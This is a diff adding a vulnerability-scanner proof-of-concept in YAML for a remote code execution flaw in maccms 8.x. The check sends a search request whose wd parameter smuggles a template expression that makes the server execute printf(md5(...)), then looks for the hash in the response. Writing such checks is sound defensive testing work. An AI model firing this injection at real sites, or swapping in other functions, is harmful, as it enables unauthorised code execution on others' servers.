@@ -1,0 +1,19 @@
+detail:
+  Affected Version: maccms8.x
+  author: hanxiansheng26(https://github.com/hanxiansheng26)
+  links:
+  - https://www.cnblogs.com/test404/p/7397755.html
+expression: r0()
+manual: true
+name: poc-yaml-maccms-rce
+rules:
+  r0:
+    expression: response.body.bcontains(bytes(md5(string(r))))
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /index.php?m=vod-search&wd={if-A:printf(md5({{r}}))}{endif-A}
+set:
+  r: randomInt(800000000, 1000000000)
+transport: http
